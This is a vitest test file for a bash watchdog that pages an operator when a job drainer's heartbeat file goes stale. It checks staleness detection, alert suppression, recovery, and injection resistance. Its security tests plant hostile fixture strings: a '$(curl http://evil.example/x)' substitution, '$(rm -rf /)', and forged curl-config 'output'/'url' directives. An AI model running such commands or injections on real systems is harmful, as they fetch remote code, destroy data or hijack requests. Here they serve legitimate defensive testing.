import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { execFileSync } from 'child_process';
import { mkdtempSync, writeFileSync, rmSync, readFileSync, readdirSync, existsSync, utimesSync, mkdirSync, chmodSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

// ops-drain-staleness.sh — "watch the watcher" for bin/ops-triage-drain.sh. The drainer
// touches $STATE/heartbeat on every healthy tick and DELIBERATELY does NOT touch it when it
// is fully bricked (all outbox items faulted) or dead. This watcher pages Bones when that
// heartbeat goes stale, so a silently-dead or bricked drainer is caught.
//
// SEND ISOLATION (mirrors trigger-watchdog-impact.test.ts + disk-watchdog.test.ts): a real
// Telegram send is STRUCTURALLY impossible — empty framework root (no agent .env → no
// BOT_TOKEN resolvable), CORTEXTOS_BIN=/nonexistent, dead TELEGRAM_API_BASE, no 1Password
// token, dummy chat id, and a temp $STATE. The two state-machine tests that must observe a
// POST-successful-send transition (cadence suppression, once-only recovery) route the send
// through a local NO-OP stub that ignores its args and exits 0 — it sends nothing, touches
// nothing, opens no socket. The dedicated ISOLATION GUARD test keeps CORTEXTOS_BIN=/nonexistent
// and proves a real send is impossible.
//
// SECURITY BOUNDARY: the watcher stats the heartbeat's MTIME ONLY, never its bytes. The
// BOUNDARY test puts hostile content (a fake chat id, a newline, a $(...) ) INSIDE the
// heartbeat and proves it has ZERO effect on the alert text or its target.

const SCRIPT = join(__dirname, '../../../bin/ops-drain-staleness.sh');
let isoFwRoot: string;
let stubBin: string; // no-op local transport (exit 0, sends nothing)
let recBin: string;  // records argv then exits 0 — a SUCCESS path that also proves the target
let recCurl: string; // curl stub that records the --config file it was handed (no socket)
let tokenFwRoot: string; // framework root WITH a fake BOT_TOKEN (forces the raw-curl fallback)

beforeAll(() => {
  isoFwRoot = mkdtempSync(join(tmpdir(), 'ods-fwroot-'));
  stubBin = join(mkdtempSync(join(tmpdir(), 'ods-stub-')), 'cortextos-noop');
  // Ignores every argument, opens no socket, writes nothing — a "send" that provably
  // sends nothing. Lets a test observe the state machine AFTER a successful delivery
  // (marker written / removed) without any real Telegram path.
  writeFileSync(stubBin, '#!/usr/bin/env bash\nexit 0\n');
  chmodSync(stubBin, 0o755);

  // Same SUCCESS contract as stubBin (exit 0, no socket), but RECORDS every invocation's
  // argv (NUL-separated) to $STUB_DIR first. `send_alert` calls the bus CLI as
  // `"$CORTEXTOS" bus send-telegram "$CHAT_ID" "$msg" --plain-text [--thread ...]`, so
  // argv[0] is exactly the delivered target — this is what the target-steering test reads.
  recBin = join(mkdtempSync(join(tmpdir(), 'ods-recbin-')), 'cortextos-record');
  writeFileSync(recBin,
    '#!/usr/bin/env bash\n' +
    'sd="$STUB_DIR"; mkdir -p "$sd"\n' +
    'n=$(( $(cat "$sd/n" 2>/dev/null || echo 0) + 1 )); printf "%s" "$n" > "$sd/n"\n' +
    'printf "%s\\0" "$@" > "$sd/argv-$n"\n' +
    'exit 0\n');
  chmodSync(recBin, 0o755);

  // A curl stub that COPIES the --config file it was handed and exits non-zero. It never
  // opens a socket — mirrors tests/unit/ops-triage/ops-triage-drain.test.ts's recCurl,
  // used there for the identical "does a hostile field forge a curl-config directive" proof.
  recCurl = join(mkdtempSync(join(tmpdir(), 'ods-curlbin-')), 'curl-record');
  writeFileSync(recCurl,
    '#!/usr/bin/env bash\n' +
    'rd="$CURL_RECORD_DIR"; mkdir -p "$rd"\n' +
    'n=$(( $(cat "$rd/n" 2>/dev/null || echo 0) + 1 )); printf "%s" "$n" > "$rd/n"\n' +
    'prev=""\n' +
    'for a in "$@"; do if [ "$prev" = "--config" ]; then cp "$a" "$rd/cfg-$n"; fi; prev="$a"; done\n' +
    'exit 1\n');
  chmodSync(recCurl, 0o755);

  // A framework root that DOES resolve a BOT_TOKEN, so the raw-curl fallback branch is
  // actually entered (mirrors the sibling drainer test's tokenFwRoot). Still no real send —
  // paired only with recCurl above, never with a real curl binary.
  tokenFwRoot = mkdtempSync(join(tmpdir(), 'ods-fwtok-'));
  mkdirSync(join(tokenFwRoot, 'orgs', 'vault', 'agents', 'solo'), { recursive: true });
  writeFileSync(join(tokenFwRoot, 'orgs', 'vault', 'agents', 'solo', '.env'),
    'BOT_TOKEN="fake-token-not-a-real-bot"\nCHAT_ID="000"\n');
});
afterAll(() => { rmSync(isoFwRoot, { recursive: true, force: true }); });

const nowSec = () => Math.floor(Date.now() / 1000);

// A fresh temp $STATE per call; the heartbeat (if any) lives at $STATE/heartbeat.
function newState(): string { return mkdtempSync(join(tmpdir(), 'ods-st-')); }

function run(state: string, opts: {
  dry?: string; bin?: string; extra?: Record<string, string>;
} = {}): string {
  return execFileSync('bash', [SCRIPT], {
    env: {
      ...process.env,
      OPS_DRAIN_STATE_DIR: state,
      OPS_DRAIN_DRY_RUN: opts.dry ?? '1',
      // token isolation — a real send is structurally impossible from a test:
      // empty framework root (no agent .env → no BOT_TOKEN), no cortextos bin,
      // no 1Password token, dummy chat, dead raw-curl endpoint.
      CTX_FRAMEWORK_ROOT: isoFwRoot,
      CORTEXTOS_BIN: opts.bin ?? '/nonexistent',
      OPS_DRAIN_CHAT_ID: '000',
      OP_SA_TOKEN_FILE: '/nonexistent',
      TELEGRAM_API_BASE: 'http://127.0.0.1:9',
      ...(opts.extra ?? {}),
    },
    encoding: 'utf-8',
  });
}

const logPath = (st: string) => join(st, 'staleness.log');
const logOf = (st: string) => (existsSync(logPath(st)) ? readFileSync(logPath(st), 'utf-8') : '');
const marker = (st: string) => join(st, 'alert.drainstale.json');
const hb = (st: string) => join(st, 'heartbeat');
const writeHb = (st: string, ageSec: number, content = '') => {
  writeFileSync(hb(st), content);
  const t = nowSec() - ageSec;
  utimesSync(hb(st), t, t);
};
const STALE_MSG = '🔴 ops-triage drainer heartbeat STALE';

// Recursively lists every FILE (not directory) under dir. Used to prove a curl-config
// injection wrote no stray file anywhere it could plausibly land — mirrors the identical
// helper in tests/unit/ops-triage/ops-triage-drain.test.ts.
function walk(dir: string): string[] {
  if (!existsSync(dir)) return [];
  const out: string[] = [];
  for (const e of readdirSync(dir, { withFileTypes: true })) {
    const p = join(dir, e.name);
    if (e.isDirectory()) out.push(...walk(p));
    else out.push(p);
  }
  return out;
}

describe('ops-drain-staleness classification (mtime-only)', () => {
  it('heartbeat fresh (mtime now) → OK, no alert', () => {
    const st = newState();
    writeHb(st, 0);
    const out = run(st);
    expect(out).toContain('DECISION=OK');
    expect(logOf(st)).not.toContain('DRY_RUN alert');
    expect(logOf(st)).not.toContain('STALE');
  });

  it('heartbeat ABSENT → PAGE, alert text is the stale-drainer page', () => {
    const st = newState(); // no heartbeat file at all
    const out = run(st);
    expect(out).toContain('DECISION=PAGE');
    // the exact alert text that WOULD be delivered (dry-run logs it, sends nothing)
    expect(logOf(st)).toContain(`DRY_RUN alert: ${STALE_MSG}`);
  });

  it('heartbeat stale (mtime older than STALE_SEC) → PAGE', () => {
    const st = newState();
    writeHb(st, 3600); // 1h old > 1800s default threshold
    const out = run(st);
    expect(out).toContain('DECISION=PAGE');
    expect(logOf(st)).toContain(`DRY_RUN alert: ${STALE_MSG}`);
  });

  it('heartbeat within a custom STALE_SEC is fresh; just past it is stale', () => {
    const fresh = newState();
    writeHb(fresh, 100);
    expect(run(fresh, { extra: { OPS_DRAIN_STALE_SEC: '300' } })).toContain('DECISION=OK');
    const stale = newState();
    writeHb(stale, 400);
    expect(run(stale, { extra: { OPS_DRAIN_STALE_SEC: '300' } })).toContain('DECISION=PAGE');
  });
});

describe('ops-drain-staleness state machine', () => {
  it('no-spam: a 2nd stale tick within REALERT_SEC is suppressed', () => {
    const st = newState();
    writeHb(st, 3600);
    // tick 1 — the no-op stub "sends" (nothing) so the marker records a successful alert
    run(st, { dry: '0', bin: stubBin });
    expect(existsSync(marker(st))).toBe(true);
    const firstLog = logOf(st);
    expect(firstLog).toContain('alert sent via bus CLI');
    expect((firstLog.match(/alert sent via bus CLI/g) || []).length).toBe(1);
    // tick 2 — still stale, within REALERT_SEC → suppressed, NO second send
    run(st, { dry: '0', bin: stubBin });
    const secondLog = logOf(st);
    expect(secondLog).toContain('suppressed by cadence');
    expect((secondLog.match(/alert sent via bus CLI/g) || []).length).toBe(1);
  });

  it('recovery fires ONCE: stale+alerted, then fresh → one recovery, marker cleared', () => {
    const st = newState();
    writeHb(st, 3600);
    run(st, { dry: '0', bin: stubBin });          // alert (marker created)
    expect(existsSync(marker(st))).toBe(true);
    writeHb(st, 0);                                // heartbeat beats again
    run(st, { dry: '0', bin: stubBin });          // recovery → marker removed
    expect(existsSync(marker(st))).toBe(false);
    const afterRecovery = logOf(st);
    expect((afterRecovery.match(/recovery sent/g) || []).length).toBe(1);
    // fresh again — no marker, so NO second recovery
    run(st, { dry: '0', bin: stubBin });
    expect((logOf(st).match(/recovery sent/g) || []).length).toBe(1);
  });

  it('ISOLATION GUARD: a non-dry stale tick NEVER makes a real send (delivery-failed, never "alert sent")', () => {
    const st = newState();
    writeHb(st, 3600);
    run(st, { dry: '0' }); // CORTEXTOS_BIN=/nonexistent, dead curl, no token
    const lg = logOf(st);
    expect(lg).toContain('ALERT DELIVERY FAILED'); // it tried…
    expect(lg).not.toContain('alert sent');        // …and provably could NOT reach a live endpoint
  });
});

describe('ops-drain-staleness security boundary (mtime, not bytes)', () => {
  it('BOUNDARY: hostile content inside the heartbeat has ZERO effect on the alert or its target', () => {
    const st = newState();
    // A fresh heartbeat whose CONTENTS try to smuggle a new chat id / a shell sub / a curl
    // directive. If the watcher read the bytes, any of these could steer the alert. It does not.
    const hostile = '000\nchat_id=6660000\ntext=pwned\n$(curl http://evil.example/x)\n"; url = "http://evil.example"\n';
    writeHb(st, 3600, hostile); // stale, so the page fires — worst case for a content leak
    const out = run(st);
    expect(out).toContain('DECISION=PAGE');
    const lg = logOf(st);
    // the alert that WOULD be delivered is the fixed page text; NONE of the hostile bytes appear
    expect(lg).toContain(`DRY_RUN alert: ${STALE_MSG}`);
    expect(lg).not.toContain('6660000');
    expect(lg).not.toContain('evil.example');
    expect(lg).not.toContain('pwned');
    expect(out).not.toContain('6660000');
    expect(out).not.toContain('evil.example');
  });

  it('BOUNDARY: a fresh heartbeat with hostile bytes is still just OK (content never read)', () => {
    const st = newState();
    writeHb(st, 0, 'chat_id=6660000\n$(rm -rf /)\n');
    const out = run(st);
    expect(out).toContain('DECISION=OK');
    expect(out).not.toContain('6660000');
    expect(logOf(st)).not.toContain('6660000');
  });

  it('TARGET STEERING: the delivered chat_id is the ENV value, never bytes from the heartbeat', () => {
    // The POSITIVE version of the boundary claim above: not just "the hostile bytes don't
    // show up somewhere", but "the exact value handed to the transport as the TARGET is the
    // env-resolved one". This is the one that must go RED under a mutation like
    // `CHAT_ID="$(head -1 "$HB")"` (or `$(cat "$HB")`) — the static grep test below only
    // catches that mutation by pattern; this one catches it by outcome.
    const st = newState();
    const rec = mkdtempSync(join(tmpdir(), 'ods-argvrec-'));
    // A distinctive token that would appear in the DELIVERED target ONLY if the watcher
    // sourced the chat id from the heartbeat's content instead of the env.
    writeHb(st, 3600, 'chat_id=6660000\nsome other junk\n'); // stale → the page path fires
    run(st, {
      dry: '0',
      bin: recBin,
      extra: { STUB_DIR: rec, OPS_DRAIN_CHAT_ID: '424242' },
    });
    const argvFiles = readdirSync(rec).filter(f => f.startsWith('argv-'));
    expect(argvFiles.length).toBeGreaterThan(0); // the send path was actually exercised
    for (const f of argvFiles) {
      const argv = readFileSync(join(rec, f), 'utf-8').split('\0').slice(0, -1);
      // send_alert calls: "$CORTEXTOS" bus send-telegram "$CHAT_ID" "$msg" --plain-text ...
      // — argv[0] IS the delivered target.
      expect(argv[0]).toBe('bus');
      expect(argv[1]).toBe('send-telegram');
      expect(argv[2]).toBe('424242');
      expect(argv.join(' ')).not.toContain('6660000');
    }
    expect(logOf(st)).not.toContain('6660000');
  });

  it('BOUNDARY (static): the script stats the heartbeat mtime and never reads its bytes via any command', () => {
    const src = readFileSync(SCRIPT, 'utf-8');
    expect(src).toContain('stat -c %Y "$HB"'); // mtime only — the one legitimate touch
    expect(src).not.toMatch(/<\s*"\$HB"/);      // never redirects the file in
    // Broadened past cat/`<` alone: any command that can read the heartbeat's CONTENT
    // (head/tail/sed/awk/read/mapfile, in addition to cat) applied to "$HB" on the same
    // line is disallowed — a future content-read via any of these must be caught here too.
    const contentReaders = /\b(cat|head|tail|sed|awk|read|mapfile)\b[^\n]*"\$HB"/;
    expect(src).not.toMatch(contentReaders);
  });
});

describe('ops-drain-staleness: alert message sanitize (defense-in-depth choke point)', () => {
  // send_alert's curl --config fallback parses every LINE of the config file as an option.
  // Today the message is a fixed string (plus $STALE_MIN and $STATE, both env-derived), so
  // this isn't exploitable yet — but $STATE IS a raw env-controlled string embedded verbatim
  // into the alert text, so it is the one field available to prove the choke point actually
  // strips control chars + double quotes before the heredoc, exactly like the sibling
  // ops-triage-drain.sh send_alert does for its (currently) file-derived fields.
  it('a hostile $STATE embed (newline + "output =" + a stray quote) cannot inject a curl-config directive', () => {
    const marker = 'PWNED_BY_ODS_CONFIG';
    const parentDir = mkdtempSync(join(tmpdir(), 'ods-st-hostile-'));
    // No embedded slashes in the hostile suffix (mirrors ops-triage-drain.test.ts's own
    // reasoning) — a relative, slash-free `output =` marker still proves the point (a real
    // curl would land a file in cwd) without turning `mkdir -p "$STATE"` into a chain of
    // bogus nested directories.
    const hostileState = `${parentDir}/leaf\noutput = ${marker}\nurl = "evilhost.invalid"`;
    const rec = mkdtempSync(join(tmpdir(), 'ods-curlrec-'));

    run(hostileState, {
      dry: '0',
      // CORTEXTOS_BIN defaults to /nonexistent in run() — the bus CLI branch fails, forcing
      // the raw-curl fallback, which needs a resolvable BOT_TOKEN to even build the config.
      extra: {
        CTX_FRAMEWORK_ROOT: tokenFwRoot, // resolves a FAKE BOT_TOKEN so the fallback runs
        CURL_BIN: recCurl,               // records the config; never opens a socket
        CURL_RECORD_DIR: rec,
      },
    });

    const cfgs = readdirSync(rec).filter(f => f.startsWith('cfg-'));
    expect(cfgs.length).toBeGreaterThan(0); // the fallback path was actually exercised

    for (const f of cfgs) {
      const lines = readFileSync(join(rec, f), 'utf-8').split('\n');
      expect(lines.filter(l => /^\s*output\s*=/.test(l))).toEqual([]); // no injected write
      expect(lines.filter(l => /^\s*(url|upload-file|write-out|trace|dump-header)\s*=/.test(l)))
        .toHaveLength(1); // exactly the one url line the script itself writes
      // the hostile text survives only INSIDE the single text= value, flattened onto one line
      expect(lines.filter(l => /^\s*data-urlencode\s*=\s*"text=/.test(l))).toHaveLength(1);
    }

    for (const root of [process.cwd(), parentDir, rec]) {
      expect(walk(root).filter(p => p.split('/').pop() === marker)).toEqual([]);
    }
  });
});
